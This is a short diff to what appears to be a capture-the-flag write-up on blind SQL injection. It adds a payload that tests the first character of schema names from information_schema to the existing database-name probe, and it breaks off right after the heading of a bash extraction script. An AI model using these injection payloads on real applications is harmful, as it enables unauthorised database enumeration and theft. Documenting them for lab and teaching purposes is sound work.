@@ -14,7 +14,9 @@
 ```sql
 admin' and (select substr(database(),1,1))='s'-- -
 ```
-
+```sql
+admin' and (select substr(schema_name,1,1) from information_schema.schemata)='s'-- -
+```
 ## Use this bash script to extract Database, tables, columns, and the flag. Just change the payload and total_positions(the length):
 ```bash
 #!/bin/bash
